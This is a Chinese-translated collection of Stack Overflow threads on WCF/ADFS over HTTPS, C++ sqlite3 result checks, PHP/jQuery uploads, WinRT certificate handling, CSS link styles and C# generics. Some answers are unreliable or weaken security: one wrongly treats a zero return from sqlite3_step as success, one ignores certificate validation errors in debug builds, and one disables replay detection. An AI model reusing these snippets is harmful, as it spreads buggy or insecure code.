          <security defaultAlgorithmSuite="Default"
                    authenticationMode="SecureConversation"
                    requireDerivedKeys="true"
                    securityHeaderLayout="Strict"
                    includeTimestamp="true"
                    keyEntropyMode="CombinedEntropy"
                    messageProtectionOrder="SignBeforeEncryptAndEncryptSignature"
                    messageSecurityVersion="WSSecurity11WSTrust13WSSecureConversation13WSSecurityPolicy12BasicSecurityProfile10"
                    requireSecurityContextCancellation="true"
                    requireSignatureConfirmation="false">
            <localClientSettings cacheCookies="true"
                                 detectReplays="true"
                                 replayCacheSize="900000"
                                 maxClockSkew="00:05:00"
                                 maxCookieCachingTime="Infinite"
                                 replayWindow="00:05:00"
                                 sessionKeyRenewalInterval="10:00:00"
                                 sessionKeyRolloverInterval="00:05:00"
                                 reconnectTransportOnFailure="true"
                                 timestampValidityDuration="00:05:00"
                                 cookieRenewalThresholdPercentage="60" />
            <localServiceSettings detectReplays="true"
                                  issuedCookieLifetime="10:00:00"
                                  maxStatefulNegotiations="128"
                                  replayCacheSize="900000"
                                  maxClockSkew="00:05:00"
                                  negotiationTimeout="00:01:00"
                                  replayWindow="00:05:00"
                                  inactivityTimeout="00:02:00"
                                  sessionKeyRenewalInterval="15:00:00"
                                  sessionKeyRolloverInterval="00:05:00"
                                  reconnectTransportOnFailure="true"
                                  maxPendingSessions="128"
                                  maxCachedCookies="1000"
                                  timestampValidityDuration="00:05:00" />
            <secureConversationBootstrap defaultAlgorithmSuite="Default"
                                         authenticationMode="IssuedTokenForSslNegotiated"
                                         requireDerivedKeys="true"
                                         securityHeaderLayout="Strict"
                                         includeTimestamp="true"
                                         keyEntropyMode="CombinedEntropy"
                                         messageProtectionOrder="SignBeforeEncryptAndEncryptSignature"
                                         messageSecurityVersion="WSSecurity11WSTrust13WSSecureConversation13WSSecurityPolicy12BasicSecurityProfile10"
                                         requireSecurityContextCancellation="true"
                                         requireSignatureConfirmation="true">
              <issuedTokenParameters keySize="256"
                                     keyType="SymmetricKey"
                                     tokenType="">
                <additionalRequestParameters>
                  <trust:SecondaryParameters xmlns:trust="http://docs.oasis-open.org/ws-sx/ws-trust/200512">
                    <trust:KeyType xmlns:trust="http://docs.oasis-open.org/ws-sx/ws-trust/200512">http://docs.oasis-open.org/ws-sx/ws-trust/200512/SymmetricKey</trust:KeyType>
                    <trust:KeySize xmlns:trust="http://docs.oasis-open.org/ws-sx/ws-trust/200512">256</trust:KeySize>
                    <trust:Claims Dialect="http://schemas.xmlsoap.org/ws/2005/05/identity"
                                  xmlns:trust="http://docs.oasis-open.org/ws-sx/ws-trust/200512">
                      <wsid:ClaimType Uri="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name"
                                      Optional="true"
                                      xmlns:wsid="http://schemas.xmlsoap.org/ws/2005/05/identity" />
                      <wsid:ClaimType Uri="http://schemas.microsoft.com/ws/2008/06/identity/claims/role"
                                      Optional="true"
                                      xmlns:wsid="http://schemas.xmlsoap.org/ws/2005/05/identity" />
                      <wsid:ClaimType Uri="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier"
                                      Optional="true"
                                      xmlns:wsid="http://schemas.xmlsoap.org/ws/2005/05/identity" />
                      <wsid:ClaimType Uri="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"
                                      Optional="true"
                                      xmlns:wsid="http://schemas.xmlsoap.org/ws/2005/05/identity" />
                    </trust:Claims>
                    <trust:KeyWrapAlgorithm xmlns:trust="http://docs.oasis-open.org/ws-sx/ws-trust/200512">http://www.w3.org/2001/04/xmlenc#rsa-oaep-mgf1p</trust:KeyWrapAlgorithm>
                    <trust:EncryptWith xmlns:trust="http://docs.oasis-open.org/ws-sx/ws-trust/200512">http://www.w3.org/2001/04/xmlenc#aes256-cbc</trust:EncryptWith>
                    <trust:SignWith xmlns:trust="http://docs.oasis-open.org/ws-sx/ws-trust/200512">http://www.w3.org/2000/09/xmldsig#hmac-sha1</trust:SignWith>
                    <trust:CanonicalizationAlgorithm xmlns:trust="http://docs.oasis-open.org/ws-sx/ws-trust/200512">http://www.w3.org/2001/10/xml-exc-c14n#</trust:CanonicalizationAlgorithm>
                    <trust:EncryptionAlgorithm xmlns:trust="http://docs.oasis-open.org/ws-sx/ws-trust/200512">http://www.w3.org/2001/04/xmlenc#aes256-cbc</trust:EncryptionAlgorithm>
                  </trust:SecondaryParameters>
                </additionalRequestParameters>
                <issuer address="https://dev1dc2.dev1.mydomain.com/adfs/services/trust/13/usernamemixed"
                        bindingConfiguration="https://dev1dc2.dev1.mydomain.com/adfs/services/trust/13/usernamemixed"
                        binding="ws2007HttpBinding" />
                <issuerMetadata address="https://dev1dc2.dev1.mydomain.com/adfs/services/trust/mex" />
              </issuedTokenParameters>
              <localClientSettings cacheCookies="true"
                                   detectReplays="true"
                                   replayCacheSize="900000"
                                   maxClockSkew="00:05:00"
                                   maxCookieCachingTime="Infinite"
                                   replayWindow="00:05:00"
                                   sessionKeyRenewalInterval="10:00:00"
                                   sessionKeyRolloverInterval="00:05:00"
                                   reconnectTransportOnFailure="true"
                                   timestampValidityDuration="00:05:00"
                                   cookieRenewalThresholdPercentage="60" />
              <localServiceSettings detectReplays="true"
                                    issuedCookieLifetime="10:00:00"
                                    maxStatefulNegotiations="128"
                                    replayCacheSize="900000"
                                    maxClockSkew="00:05:00"
                                    negotiationTimeout="00:01:00"
                                    replayWindow="00:05:00"
                                    inactivityTimeout="00:02:00"
                                    sessionKeyRenewalInterval="15:00:00"
                                    sessionKeyRolloverInterval="00:05:00"
                                    reconnectTransportOnFailure="true"
                                    maxPendingSessions="128"
                                    maxCachedCookies="1000"
                                    timestampValidityDuration="00:05:00" />
            </secureConversationBootstrap>
          </security>
          <textMessageEncoding maxReadPoolSize="64"
                               maxWritePoolSize="16"
                               messageVersion="Default"
                               writeEncoding="utf-8">
            <readerQuotas maxDepth="32"
                          maxStringContentLength="8192"
                          maxArrayLength="16384"
                          maxBytesPerRead="4096"
                          maxNameTableCharCount="16384" />
          </textMessageEncoding>
          <httpsTransport manualAddressing="false"
                          maxBufferPoolSize="524288"
                          maxReceivedMessageSize="65536"
                          allowCookies="false"
                          authenticationScheme="Negotiate"
                          bypassProxyOnLocal="false"
                          decompressionEnabled="true"
                          hostNameComparisonMode="StrongWildcard"
                          keepAliveEnabled="true"
                          maxBufferSize="65536"
                          proxyAuthenticationScheme="Anonymous"
                          realm=""
                          transferMode="Buffered"
                          unsafeConnectionNtlmAuthentication="false"
                          useDefaultWebProxy="true" />
        </binding>
      </customBinding>
      <ws2007HttpBinding>
        <binding name="https://dev1dc2.dev1.mydomain.com/adfs/services/trust/13/usernamemixed"
                 closeTimeout="00:01:00"
                 openTimeout="00:01:00"
                 receiveTimeout="00:10:00"
                 sendTimeout="00:01:00"
                 bypassProxyOnLocal="false"
                 transactionFlow="false"
                 hostNameComparisonMode="StrongWildcard"
                 maxBufferPoolSize="524288"
                 maxReceivedMessageSize="65536"
                 messageEncoding="Text"
                 textEncoding="utf-8"
                 useDefaultWebProxy="true"
                 allowCookies="false">
          <readerQuotas maxDepth="32"
                        maxStringContentLength="8192"
                        maxArrayLength="16384"
                        maxBytesPerRead="4096"
                        maxNameTableCharCount="16384" />
          <reliableSession ordered="true"
                           inactivityTimeout="00:10:00"
                           enabled="false" />
          <security mode="TransportWithMessageCredential">
            <transport clientCredentialType="None"
                       proxyCredentialType="None"
                       realm="" />
            <message clientCredentialType="UserName"
                     negotiateServiceCredential="true"
                     algorithmSuite="Default"
                     establishSecurityContext="false" />
          </security>
        </binding>
      </ws2007HttpBinding>
    </bindings>
  </system.serviceModel>
  <system.diagnostics>
    <sources>
      <source name="System.ServiceModel"
              switchValue="Information, ActivityTracing"
              propagateActivity="true">
        <listeners>
          <add name="xml" />
        </listeners>
      </source>
      <source name="System.ServiceModel.MessageLogging">
        <listeners>
          <add name="xml" />
        </listeners>
      </source>
      <source name="myUserTraceSource"
              switchValue="Information, ActivityTracing">
        <listeners>
          <add name="xml" />
        </listeners>
      </source>
    </sources>
    <sharedListeners>
      <add name="xml"
           type="System.Diagnostics.XmlWriterTraceListener"
           initializeData="ClientErrors.svclog" />
    </sharedListeners>
  </system.diagnostics>

</configuration> 
```

WCF 服务.config：

```
<?xml version="1.0"?>

<configuration>
    <configSections>
        <section name="microsoft.identityModel"
                 type="Microsoft.IdentityModel.Configuration.MicrosoftIdentityModelSection, Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
    </configSections>
    <location path="FederationMetadata">
        <system.web>
            <authorization>
                <allow users="*" />
            </authorization>
        </system.web>
    </location>
    <system.web>
        <compilation debug="true"
                     targetFramework="4.0">
            <assemblies>
                <add assembly="Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
            </assemblies>
        </compilation>
    </system.web>
    <system.serviceModel>
        <services>
            <service name="AdfsWcfHelloWorldServices.SayHelloService">
                <endpoint address="https://mydevbox.dev1.mydomain.com/AdfsWcfHelloWorld/SayHelloService.svc"
                          binding="ws2007FederationHttpBinding"
                          contract="AdfsWcfHelloWorldServices.ISayHelloService" />
            </service>
        </services>
        <behaviors>
            <serviceBehaviors>
                <behavior>
                    <serviceMetadata httpsGetEnabled="true" />
                    <federatedServiceHostConfiguration />
                    <serviceDebug includeExceptionDetailInFaults="true" />
                </behavior>
            </serviceBehaviors>
        </behaviors>
        <serviceHostingEnvironment multipleSiteBindingsEnabled="false" />
        <extensions>
            <behaviorExtensions>
                <add name="federatedServiceHostConfiguration"
                     type="Microsoft.IdentityModel.Configuration.ConfigureServiceHostBehaviorExtensionElement, Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
            </behaviorExtensions>
        </extensions>
        <protocolMapping>
            <add scheme="http"
                 binding="ws2007FederationHttpBinding" />
        </protocolMapping>
        <bindings>
            <ws2007FederationHttpBinding>
                <binding>
                    <security mode="TransportWithMessageCredential">
                        <message establishSecurityContext="false">
                            <issuerMetadata address="https://dev1dc2.dev1.mydomain.com/adfs/services/trust/mex" />
                            <claimTypeRequirements>
                                <add claimType="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name"
                                     isOptional="true" />
                                <add claimType="http://schemas.microsoft.com/ws/2008/06/identity/claims/role"
                                     isOptional="true" />
                                <add claimType="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier"
                                     isOptional="true" />
                                <add claimType="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"
                                     isOptional="true" />
                            </claimTypeRequirements>
                        </message>
                    </security>
                </binding>
            </ws2007FederationHttpBinding>
        </bindings>
    </system.serviceModel>
    <system.webServer>
        <modules runAllManagedModulesForAllRequests="true" />
    </system.webServer>
    <microsoft.identityModel>
        <service>
            <audienceUris>
                <add value="https://mydevbox.dev1.mydomain.com/AdfsWcfHelloWorld" />
            </audienceUris>
            <serviceCertificate>
                <certificateReference findValue="22909537C6356E15C20C93A5F652FB0C6AA8A282"
                                      storeLocation="LocalMachine"
                                      storeName="My"
                                      x509FindType="FindByThumbprint" />
            </serviceCertificate>
            <issuerNameRegistry type="Microsoft.IdentityModel.Tokens.ConfigurationBasedIssuerNameRegistry, Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
                <trustedIssuers>
                    <add thumbprint="E9C32071573CB4D52005EA2E7825A310D6C26B73"
                         name="http://DEV1DC2.Dev1.mydomain.com/adfs/services/trust" />
                </trustedIssuers>
            </issuerNameRegistry>
        </service>
    </microsoft.identityModel>
    <appSettings>
        <add key="FederationMetadataLocation"
             value="https://dev1dc2.dev1.mydomain.com/FederationMetadata/2007-06/FederationMetadata.xml" />
    </appSettings>
  <system.diagnostics>
    <sources>
      <source name="System.ServiceModel"
              switchValue="Information, ActivityTracing"
              propagateActivity="true" >
        <listeners>
          <add name="xml"/>
        </listeners>
      </source>
      <source name="System.ServiceModel.MessageLogging">
        <listeners>
          <add name="xml"/>
        </listeners>
      </source>
      <source name="myUserTraceSource"
              switchValue="Information, ActivityTracing">
        <listeners>
          <add name="xml"/>
        </listeners>
      </source>
    </sources>
    <sharedListeners>
      <add name="xml"
           type="System.Diagnostics.XmlWriterTraceListener"
           initializeData="ServerErrors.svclog" />
    </sharedListeners>
  </system.diagnostics>
</configuration> 
```

**更多细节：**

*   服务和客户端目前都在同一个盒子上运行
*   所有证书均由我们域中的 CA 创建，并受到所有 (1) 台机器的完全信任
*   我已成功从 ADFS 获取我的安全令牌
*   我使用`ChannelFactory<T>(binding).CreateChannelWithIssuedToken(myToken)`（伪代码）连接到服务
*   调用服务上的第一个方法时发生错误
*   就像我说的那样，这一切都可以在没有 HTTPS 的情况下工作，并且该服务能够很好地从令牌中提取经过验证的声明，`(Thread.CurrentPrincipal.Identity as IClaimsIdentity).Claims`但是由于某些愚蠢的原因，我无法在双方都配置有 SSL 的正确连接

我真的很感激一些帮助。:-)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-16T17:21:36.347

[MSDN 论坛上](http://social.msdn.microsoft.com/Forums/en-US/wcf/thread/c6d423ce-7030-499d-b0ce-6a9c30a1cfe1/)的一个模组 LeoTang帮助我解决了这个问题。问题出在客户端上。引用他的话：

> 在自定义绑定的“”部分中，authenticationMode 的值设置为“IssuedTokenForSslNegotiated”。

我遇到的另一个问题是 messageSecurityVersion - 我需要将其更改为`WSSecurity11WSTrustFebruary2005WSSecureConversationFebruary2005WSSecurityPolicy11BasicSecurityProfile10`. 最后，我不得不关闭我的服务器配置的重播，因为一个随机数丢失的错误。这对我来说不是一个重要的功能，所以我禁用了它而不是进一步调查。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-30T14:15:39.350

刚刚使用 ADFS 对 WCF 服务进行身份验证，并且真的没有胃口再次阅读整个配置，但根据我的经验，如果凭据不正确或客户端根本没有提供，协商失败总是会发生。

[花一些时间为 WCF http://msdn.microsoft.com/en-us/library/ee517292.aspx](http://msdn.microsoft.com/en-us/library/ee517292.aspx)设置诊断和我偶然发现的这个小警告[http://intrepiddeveloper.wordpress.com/2008/08/07 /安全事件日志审计/](http://intrepiddeveloper.wordpress.com/2008/08/07/security-event-logging-auditing/)。

希望它有所帮助

# c++ - C++ sqlite3如何知道一条sql语句执行成功？

> ID：11955588
> 
> 赞同：0
> 
> 时间：2012-08-14T15:21:23.887
> 
> 标签：c++, sqlite

C++ sqlite3如何知道一条sql语句执行成功？

我正在尝试使用 sqlite3 插入记录

我想知道如何知道它是否成功

```
string sqlstatement = "INSERT INTO abe_account (name,department,password) VALUES ("
+quotesql(name) + ","
+quotesql(department) + ","
+quotesql(password) + ");";

   if (sqlite3_open("abeserver.db", &db) == SQLITE_OK)
    {
    sqlite3_prepare( db, sqlstatement.c_str(), -1, &stmt, NULL );//preparing the statement
    sqlite3_step( stmt );//executing the statement
        }
    else
    {
        cout << "Failed to open db\n";
    }

    sqlite3_finalize(stmt); 
```

我们如何从 sqlite3 获取成功信号，例如成功添加行或成功删除行等，并将值分配给布尔值或字符串

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:23:23.523

`sqlite3_step()`有多个整数形式的返回值。代码 0 表示语句的成功执行。[您可以在此处](http://www.sqlite.org/c3ref/c_abort.html)找到其余代码

> 我们如何..将该值分配给变量

```
if ( ! sqlite3_step( stmt ) ) cout << "it worked" << endl 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:25:18.743

你也可以做

```
if(sqlite3_step(stmt)!=SQLITE_DONE)
{
  error handling here
} 
```

这里有一些关于 sqlite3 常量的文档：[结果代码](http://www.sqlite.org/c3ref/c_abort.html)

# php - Slim PHP 返回的jQuery .submit() 上传表单显示响应

> ID：11955589
> 
> 赞同：1
> 
> 时间：2012-08-14T15:21:25.637
> 
> 标签：php, jquery, submit, slim

我有一个用于将文件上传到服务器的 html 表单。为简洁起见，我只展示了基本的部分

```
 <form id='uploadform' method='post' enctype='multipart/form-data' action='index.php/upload'>
   <input name='myFile' id='myFile' type='file'/>
 </form>
 <input type='button' id='upload' value='Upload'/>
 <div id='response'></div> 
```

我使用 jQuery.submit() 提交表单：

```
 $('#uploadform').submit(); 
```

业务逻辑是 Slim PHP : $app->post('/upload', 'uploadFile'); ……

```
 function uploadFile(){
       try{
           // if success uploading
           $app->redirect('/main-page');

       }catch(Exception $e){
           // if error 
           echo $e->getMessage();

       }
    } 
```

**问题：**如果由于某种原因上传失败，则会引发异常，用户会被带到 PHP 错误页面。如果上传无异常完成，应用程序将被重定向到主页。

**需要的是：**如果上传成功，应用程序应该像现在一样重定向到主页......但是如果抛出任何异常，而不是转到 PHP 错误页面，应用程序应该停留在上传页面并使用id = 'response' 应该显示异常。

有没有可能用 jQuery submit() 做这样的事情：

```
 $('#uploadform').submit(function(response){
           $('response').html(response);
     }); 
```

？？？

**我知道 JQuery 上传文件插件会让生活更轻松......但这不是我的选择......**

感谢您的任何指点！

是否可以

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T06:36:33.767

过去我遇到过类似的问题，我想出的是使用不可见的 iframe 来发布文件上传并返回 html 结果，希望对您有所帮助！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-04T11:30:05.840

我想这就是你要找的

html代码：

```
<form id='uploadform' method='post' enctype='multipart/form-data' action='index.php/upload' target="hiddeniframe">
    <input name='myFile' id='myFile' type='file'/>
</form>
<iframe name="hiddeniframe" id="hiddeniframe" style="display: none"></iframe>
<input type='button' id='upload' value='Upload'/>
<div id='response'></div> 
```

我添加了一个隐藏的 iframe，并将表单的目标设为 iframe 的 id。这将使表单提交到 iframe，因此整个页面不会重新加载

javascript代码：

```
<script type="text/javascript">
    window.showUploadError = function(error) {
        $('#response').html(error);
    };

     $('#uploadform').submit();
</script> 
```

我添加了一个名为 showUploadError 的全局函数，如果出现错误，它将从 php 上传函数中调用

php代码

```
<?php
    function uploadFile(){
        try{
            // if success uploading
            ?>
            <script type="text/javascript">
                parent.location.href = '/main-page'
            </script>
            <?php 
            die();
        }catch(Exception $e){
        // if error 
        ?>
            <script type="text/javascript">
                parent.showUploadError('Upload failed');
            </script>
        <?php
   }
} 
```

如果上传成功，我们会输出一些 javascript 代码，将父页面（主页面）重定向到新位置，否则它将调用 showUploadError javascript 函数。

请记住，这是一个粗略的例子，我没有测试过。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-05T19:24:06.257

您需要在这里使用 ajax 是使用 ajax 上传文件的示例

[使用 jQuery.ajax 发送 multipart/formdata](https://stackoverflow.com/questions/5392344/sending-multipart-formdata-with-jquery-ajax)

如果没有 ajax，您可以通过 GET 方法重定向回用户并发送错误文本并将此文本放入响应标记中

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-04T12:58:21.400

您可以选择将“提交”发送到“iframe”，然后使用“js”获取响应。在 PHP 中，您发送一条消息，然后在“JS”中解释该消息。

HTML：

```
<form id="uploadform" method="post" enctype="multipart/form-data" action="index.php/upload" target="uploadformResponse">
   <input name='myFile' id='myFile' type='file'/>
</form>
<input type='button' id='upload' value='Upload'/>
<div id='response'></div>
<div style="display:none;">
    <iframe name="uploadformResponse" id="uploadformResponse"></iframe>
</div> 
```

Javascript：

```
var runSubmitForm = function() {

   var 
      $iframe = $('#uploadformResponse'),
      fnLoadIframe = function(event) {
         $iframe.unbind('load');
         var 
             response = $iframe.contents(),
             aresponse = response.split('|');  

         console.log('debug respnse', response);

         if (aresponse.length != 2) {
            $('#response').html("Error I ???");
         }

         if (aresponse[0] == '1') {
             window.location = aresponse[1];
         }
         else if (aresponse[0] == '0') {
            $('#response').html(aresponse[1]);
         }
         else {
            $('#response').html("Error II ???");
         }
      };

   $iframe.bind('load', fnLoadIframe);
   $('#uploadform').submit();
}; 
```

PHP：

```
function uploadFile(){
   try{
      // if success uploading
      echo '1|/main-page';
   } catch(Exception $e) {
      // if error 
      echo '0|' . $e->getMessage();
   }
   exit; // optional
} 
```

# c# - 使用 WinRT 接受无效 SSL 证书

> ID：11955590
> 
> 赞同：8
> 
> 时间：2012-08-14T15:21:39.053
> 
> 标签：c#, microsoft-metro, security, windows-runtime

在某些情况下，您希望您的应用程序接受无效的 SSL 证书（测试环境/自签名证书等）。

在 .NET 世界中，人们会使用`ServerCertificateValidationCallback`该类来做到这一点。不幸的是，该类在 WinRT 上下文中不存在。

我需要使用托管在没有有效 ssl 证书的服务器上的 WinRT 使用 Web API。

如何使用`HttpClient`类或任何其他适当的类在 WinRT 中接受无效的 ssl 证书。

任何帮助或替代方案将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-02-27T10:30:05.167

以下代码适用于调试场景：

```
var filter = new HttpBaseProtocolFilter();
#if DEBUG
    filter.IgnorableServerCertificateErrors.Add(ChainValidationResult.Expired);
    filter.IgnorableServerCertificateErrors.Add(ChainValidationResult.Untrusted);
    filter.IgnorableServerCertificateErrors.Add(ChainValidationResult.InvalidName);
#endif
using (var httpClient = new HttpClient(filter)) {
    ...
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-10-18T20:43:32.883

在silverlight中，这是不允许的。我还没有看到任何说它在winrt中是允许的。

# css - css 链接颜色样式最佳实践

> ID：11955594
> 
> 赞同：34
> 
> 时间：2012-08-14T15:21:40.653
> 
> 标签：css, colors, hyperlink

有许多用于样式链接颜色的 css 示例。

[html5boilerplate.com](http://html5boilerplate.com/)为链接提供了这样的 css 代码：

```
a { color: #00e; }
a:visited { color: #551a8b; }
a:hover { color: #06e; }​ 
```

**对于大多数情况来说是否足够好？**

或者也许存在更好的css代码来设置链接的颜色？

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2012-08-14T15:28:24.933

在绝大多数情况下，这绝对足够了。

请记住，链接样式的正确顺序是：

```
a:link           { color: #c00 }  /* unvisited links       */
a:visited        { color: #0c0 }  /* visited links         */
a:hover, a:focus { color: #00c }  /* user hovers, or focus */
a:active         { color: #ccc }  /* active links          */ 
```

这`outline`对您来说可能看起来“丑陋”，但这是一个非常重要的可访问性功能。如果您删除它 - 请注意提供一种替代方法来正确区分当前元素（更大/更粗的字体、高对比度背景等）

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-14T15:32:01.253

我总是重置浏览器之间可能不同的设置。

我还喜欢通过添加图像（类似于维基百科中的图像）来以不同方式标记指向外部网站的链接。

```
a,
a:link,
a:active,
a:visited,
a:hover {
    color:           #d30;
    text-decoration: none;
}

a:hover {
    text-decoration: underline;
}

/* Links to external websites */
a.external:before {
    content:         url(./pics/external.png);
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-08-14T15:25:33.367

如果您想确定您正在样式化链接（而不是不是链接的锚点），您应该使用`a:link`而不是`a`.

你可以`a:active`在最后添加。在这里你有一个[教程](http://www.w3schools.com/css/css_link.asp)。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-09-28T05:54:33.350

永远不要删除那个轮廓，或者至少只为 a:active 删除它。如果你对所有锚点都这样做，那么它也将被删除用于键盘导航的 a:focus。过度依赖悬停也是非常糟糕的，因为触摸屏上不存在悬停。

我喜欢让所有链接都易于与其他内容区分开来。这是我个人的偏好：

**2016版**

```
/* The order is important! Do not use fixed values like px! Always check contrast between text and background for accessibility! */

a { border-bottom: thin solid;
    color: rgb(0,0,192);
    font-weight: bolder;
    text-decoration: none;
}
a:visited { color: rgb(160,0,160); }
a:active { color: rgb(192,0,0); }
a:active, a:focus, a:hover { border-bottom-width: medium; } 
```

**2015版**

```
a { border-bottom: thin solid;
    color: rgb(0,0,192);
    font-weight: 700;
    text-decoration: none;
}
a:visited { color: rgb(128,0,128); }
a:active { color: rgb(192,0,0); } /* :active MUST come after :visited */
a:active, a:focus, a:hover { border-bottom-width: medium; } 
```

**2014版**

```
a { border-bottom: 1px solid;
    color: rgb(0,0,166);
    font-weight: 700;
    text-decoration: none;
}
a:visited { color: rgb(122,0,122); }
a:active { color: rgb(166,0,0); } /* :active MUST come after :visited */
a:active, a:focus, a:hover { border-bottom: 3px solid; } 
```

**2013版**

```
a { color: rgb(0,0,166);
    font-weight: 700;
    border-bottom: 1px dotted;
    text-decoration: none;
}
a:visited { color: rgb(122,0,122); }
a:hover, a:focus, a:active { border-bottom: 2px solid; }
a:focus, a:active { color: rgb(166,0,0); } 
```

* * *

## 回答 #5

> 赞同：-3
> 
> 时间：2012-08-14T15:26:11.637

我发现它总是很好添加

一个{大纲：无；}

因为某些浏览器会在您单击链接时为链接添加恼人的轮廓

# php - php 浏览一个文件然后获取它的路径

> ID：11955603
> 
> 赞同：2
> 
> 时间：2012-08-14T15:22:06.720
> 
> 标签：php, html, file, path

一直在网上磕磕绊绊，很难找到获取浏览文件的文件路径的示例。其中一些我读到由于安全原因，此功能不再起作用。有什么想法吗？我非常需要一个样品。我已经试过很多次了。

这是目前我有：

```
<html>

<body>

<form method="post" action="file.php" enctype="multipart/form-data">

<input type="radio" name="type" value="moodle" required="required" /> Moodle<br />
<input type="radio" name="type" value="bb" required="required" /> BlackBoard<br />
<input type="file" name="file" id="file" /><br /><br />

<input type="submit" value="Submit" name="submit" />

</form> 

</body>

</html> 
```

文件.php

```
<?php

$filetype = $_POST["type"];

echo $filetype;

echo "Upload: " . $_FILES['file']['name'] . "<br />";
echo "Type: " . $_FILES['file']['tmp_name'];

if ($_FILES['file']['error'] > 0)
  {
  echo "Error: " . $_FILES["file"]["error"] . "<br />";
  }
else
  {
  echo "Upload: " . $_FILES['file']['name'] . "<br />";
  echo "Type: " . $_FILES['file']['type'] . "<br />";
  echo "Size: " . ($_FILES['file']['size'] / 1024) . " Kb<br />";
  echo "Stored in: " . $_FILES['file']['tmp_name'];
  }

function moodlezip($zipfile){

    echo "<h1>MOODLE</h1>"."<br />";

    $moodle = new Moodle();
    $zip = zip_open($zipfile);
    $ziparc = new ZipArchive;

    if ($zip)
    {
        while ($zip_entry = zip_read($zip))
        {

            $file = zip_entry_name($zip_entry);

            //echo "Name: " . $file . "<br />";

            if (strpos($file,'course.xml') !== false) {

                if ($ziparc->open($zipfile) === TRUE) {

                    $coursexml =  new SimpleXMLElement($ziparc->getFromName($file));

                    $moodle->getCourse($coursexml);

                    $ziparc->close();

                } else {
                    echo 'failed';
                }

            }

            else if (strpos($file,'forum.xml') !== false) {

                if ($ziparc->open($zipfile) === TRUE) {

                    $topicxml =  new SimpleXMLElement($ziparc->getFromName($file));

                    $moodle->getTopic($topicxml);

                    $ziparc->close();

                } else {
                    echo 'failed';
                }

            }

            else if (strpos($file,'lesson.xml') !== false) {

                if ($ziparc->open($zipfile) === TRUE) {

                    $lessonxml =  new SimpleXMLElement($ziparc->getFromName($file));

                    $moodle->getLessons($lessonxml);

                    $ziparc->close();

                } else {
                    echo 'failed';
                }

            }

            else if (strpos($file,'quiz.xml') !== false) {

                if ($ziparc->open($zipfile) === TRUE) {

                    $quizxml =  new SimpleXMLElement($ziparc->getFromName($file));

                    $moodle->getQuizzes($quizxml);

                    $ziparc->close();

                } else {
                    echo 'failed';
                }

            }

            else if (strpos($file,'questions.xml') !== false) {

                if ($ziparc->open($zipfile) === TRUE) {

                    $questionsxml =  new SimpleXMLElement($ziparc->getFromName($file));

                    $moodle->getQuestions($questionsxml);

                    $ziparc->close();

                } else {
                    echo 'failed';
                }

            }

        }

        zip_close($zip);
    }

}

require_once 'classes/backup.php';

$connect = mysql_connect("localhost","root","");

if (!$connect)
{
    die('Could not connect: ' . mysql_error());
}

mysql_close($connect);

//form upload loop folders input submit, find, bb, scorm
//class admin
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:24:39.907

使用 pathinfo() [http://php.net/manual/en/function.pathinfo.php](http://php.net/manual/en/function.pathinfo.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:45:57.457

出于安全原因，您无法获取文件的完整路径。[W3C](http://www.w3.org/TR/html401/interact/forms.html)和[RFC](http://www.faqs.org/rfcs/rfc2388.html)规范**没有**提到完整的文件路径应该可用。您只能获取文件名（`document.getElementById("filefield_id").value`例如返回名称）。

原因可能是，如果有能力获取/更改文件路径，那么也可以通过隐藏字段从用户那里窃取文件。底线：这是不可能的。*如果您告诉我们您到底*想做什么，也许我们可以提供更多帮助。

# c# - 无法实现接口成员，因为它没有匹配的返回类型 List

> ID：11955605
> 
> 赞同：23
> 
> 时间：2012-08-14T15:22:19.877
> 
> 标签：c#, generics, inheritance, interface

我有接口`IChild`和`IParent`. `IParent`有一个成员是`List<IChild>`.

我希望有实现的类，`IParent`每个类都有一个实现的成员`IChild`：

```
public interface IChild
{ 
}  

public interface IParent
{  
    List<IChild> a { get; set; }
} 

public class ChildA : IChild
{ 
} 

public class ChildB : IChild
{ 
} 

public class ParentA : IParent
{ 
    public List<ChildA> a { get; set; }
}

public class ParentB : IParent
{ 
    public List<ChildB> a { get; set; }
} 
```

但是，这段代码不会编译。错误是：

```
`MyApp.Data.ParentA` does not implement interface member `MyApp.Data.IParent.a`.
`MyApp.Data.ParentA.a` cannot implement `MyApp.Data.IParent.a` because it does not have
the matching return type of `System.Collections.Generic.List<MyApp.Data.IChild>`. 
```

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2012-08-14T15:32:38.543

使 IParent 通用：

```
public interface IChild
{
}

public interface IParent<TChild> where TChild : IChild
{
    List<TChild> a { get; set; } 
}

public class ChildA : IChild {  }   

public class ChildB : IChild {  }   

public class ParentA : IParent<ChildA>
{
    public List<ChildA> a { get; set; }
}

public class ParentB : IParent<ChildB>
{
    public List<ChildB> a { get; set; }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:27:42.447

